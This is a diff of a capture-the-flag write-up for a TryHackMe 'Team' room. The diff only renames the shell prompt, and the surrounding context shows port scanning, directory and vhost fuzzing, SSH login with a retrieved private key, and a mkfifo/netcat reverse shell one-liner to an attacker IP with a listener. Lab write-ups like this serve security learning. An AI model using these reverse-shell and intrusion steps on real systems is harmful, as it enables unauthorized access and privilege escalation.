@@ -13,7 +13,7 @@ Tags : #easy
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Team]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Team]
 └─$ rustscan -a team.thm -- -A 
  
 Open 10.10.168.250:21
@@ -38,7 +38,7 @@ PORT   STATE SERVICE REASON         VERSION
 We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Team]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Team]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -u http://team.thm  
 
 /.hta                 (Status: 403) [Size: 273]
@@ -62,7 +62,7 @@ Progress: 4746 / 4747 (99.98%)
 Using [FFuf](../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to fuzz vhosts :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Team]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Team]
 └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.team.thm' -u http://team.thm -fs 11366 -c
 ________________________________________________
 
@@ -104,7 +104,7 @@ We retrieve `dale` [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) private k
 We save it and make it executable with `chmod 600 id_dale` then use it:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Team]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Team]
 └─$ ssh -i id_dale dale@team.thm                                                          
 Last login: Mon Jan 18 10:51:32 2021
 dale@ip-10-10-168-250:~$ ls
@@ -175,7 +175,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.250.11.13 1337 >/tmp/f
 We setup a listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and wait for root [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/Scrivania]
+┌──(mdn0x㉿mdn0xonKali)-[~/Scrivania]
 └─$ nc -lvnp 1337
 listening on [any] 1337 ...
 
